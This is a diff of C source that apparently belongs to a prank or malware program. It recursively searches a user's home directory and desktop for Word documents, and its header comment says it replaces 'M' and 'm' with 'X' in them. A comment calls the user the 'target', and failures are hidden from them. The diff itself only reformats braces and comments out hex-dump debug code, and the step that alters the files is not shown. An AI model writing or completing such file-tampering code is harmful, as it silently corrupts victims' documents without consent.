@@ -15,15 +15,14 @@
 Open the .docx or .doc file and replace 'M' and 'm' with 'X'
 **********************************************************************************/
 void convertXtoM(char *filepath){
-	int c;
+	//int c;
 	FILE *file;
 	char *buffer;
 	unsigned long fileLen;
 
 	// Open the file
 	file = fopen(filepath, "rb");
-	if (!file)
-	{
+	if (!file){
 		//fprintf(stderr, "Unable to open file %s", filepath);
 		return; // Return with no error to target
 	}
@@ -35,8 +34,7 @@ void convertXtoM(char *filepath){
 
 	// Allocate memory for the buffer
 	buffer=(char *)malloc(fileLen+1);
-	if (!buffer)
-	{
+	if (!buffer){
       fclose(file);
 		return;
 	}
@@ -47,7 +45,7 @@ void convertXtoM(char *filepath){
 
 	/* For testing purposes */
 	// Print out the first 1000 bytes of data in Hex
-	for (c=0;c<1000;c++)
+	/*for (c=0;c<1000;c++)
 	{
 		printf("%.2X ", (int)buffer[c]);
 
@@ -62,7 +60,7 @@ void convertXtoM(char *filepath){
 		{
 			printf("\n");
 		}
-	}
+	}*/
 
 	free(buffer);
 
@@ -88,8 +86,7 @@ void spiderDirectory(char *homeDir, DIR *d){
 	int length;
 
 	// Loop and recurse until there are no more subdirectories
-	while ((dir = readdir(d)) != NULL)
-	{
+	while ((dir = readdir(d)) != NULL){
 		// Get the full path associated with dir->d_name
 		strcpy(currentDir, homeDir);
 		strcat(currentDir,"/");
@@ -98,8 +95,7 @@ void spiderDirectory(char *homeDir, DIR *d){
 		// If the current element of the directory is a subdirectory (and not . or ..), spider through it
 		if(strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && isDir(currentDir)){
 			currentD = opendir(currentDir);
-			if (currentD)
-			{
+			if (currentD){
 				spiderDirectory(currentDir, currentD);
 				closedir(currentD);
 			}
@@ -128,8 +124,7 @@ void* XtoM(void* param) {
 
 	// Look through the desktop and all of its subdirectories for word documents, and do the conversion XtoM
 	d = opendir(homedir);
-	if (d)
-	{
+	if (d){
 		spiderDirectory(homedir, d);
 		closedir(d);
 	}
